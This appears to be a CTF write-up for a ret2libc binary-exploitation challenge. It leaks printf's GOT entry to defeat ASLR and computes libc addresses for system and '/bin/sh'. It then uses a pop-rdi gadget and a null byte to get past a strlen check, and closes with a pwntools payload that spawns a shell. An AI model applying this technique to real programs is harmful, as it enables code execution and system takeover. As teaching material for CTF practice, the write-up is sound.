# Ret2Libc

```C
#include<stdio.h>
//#include<stdlib.h>

int main(){
    setvbuf(stdout,0,2,0);
    printf( "Where do you want to see in the memory? Give me the address in decimal:" );
    long *p;
    scanf( "%ld" , &p );
    printf( "The value in memory at %p is %p.\n" , p , *p );

    puts("Bypass the check, and ret2libcccccccccccc");

    char buf[10];
    read( 0 , buf , 200 );
    
    if( strlen( buf ) > 6 ) {
        puts( "It could not > 6. If you want the flag, Over my dead body!!!!!" );
        exit(0);
    }

    return 0;
}
```
Because ASLR is on, so we need to leak out the real address at the time running the program.

As we can see, we can throw a decimal address to obtain the real address.

So, which address should we throw?

There are two options: 1.setvbuf 2.printf

For my solution, I chose the second choice. Now, what address should we throw over?

Here, another required knowledge is about `Lazy Binding`, which has to do with `PLT (Procedure Linkage Table)` and `GOT (Global Offset Table)`. Once a function is called, its address in GOT will remain.

    400773:	bf 98 08 40 00       	mov    $0x400898,%edi
    400778:	b8 00 00 00 00       	mov    $0x0,%eax
    40077d:	e8 6e fe ff ff       	callq  4005f0 <printf@plt>
    
 From `objdump` we can see that calling `printf()` is calls `4005f0 <printf@plt>`. So that continue to look at where it goes.
 
    00000000004005f0 <printf@plt>:
    4005f0:	ff 25 32 0a 20 00    	jmpq   *0x200a32(%rip)        # 601028 <_GLOBAL_OFFSET_TABLE_+0x28>
    4005f6:	68 02 00 00 00       	pushq  $0x2
    4005fb:	e9 c0 ff ff ff       	jmpq   4005c0 <_init+0x28>
    
 Ah! It goes to `print@plt` and in the first line it jumps to `601028` in the GOT. GOT address will be one we need.
 
 Remeber this equation:
 
  <b> `Real Address = Base Address + Offset` </b>
  
So, where do we find offset of a function? Libc.so.6!

There are two ways to read `libc.so.6`:

  1.  objdump -T libc.so.6
  2.  readelf -s libc.so.6
 
For me, I prefer the second one, since it looks nicer.

After we have the offset of `printf`, we can now caculate the base address:

    Real Address (Obtain from output) = Base Address + Offset (Obtain from libc.so.6)
    Base Address = printf_addr - printf_offset
    
Then we need `system` since our goal is to call `system("/bin/sh")`

Agian `system` offset can be found in `libc.so.6`.
  
    system_addr = base_addr + system_offset
    
Now how about `/bin/sh`? Let's try finding it in `libc.so.6`! Luckily, we found it!

    strings -t x libc.so.6 | grep "/bin/sh"
    
Next, we need to caculate our payload from `objdump`, which is 0x28. 

And one import thing is to put `/bin/sh` into rdi, so, again, we need our ROPgadget:

    ROPGadget --binary ret2libc --ropchaing | grep 'pop rdi ; ret'

Later on....oh! There's one more thing if we look at `ret2libc.c` -- 

    ```C
    if( strlen( buf ) > 6 ) {
        puts( "It could not > 6. If you want the flag, Over my dead body!!!!!" );
        exit(0);
    }
    ``
 Hmmmmmm....Length checking... how are we going to pass this and overflow?
 
This has to do with a feature of string -- <b>end with `\x00` or `\0`</b>
 
Our payload will need five bytes first with `\x00` as the 6th byte then fill up the rest with padding (0x28 - 6 = 0x22 bytes)

Thus, the final payload will be:
  
```Python
p.sendline(b"A"*0x5 + b"\x00" + b"\x90"*0x22 + p64(0x400873) + p64(bin_sh_addr) + p64(sys_addr))
```
  

 
 
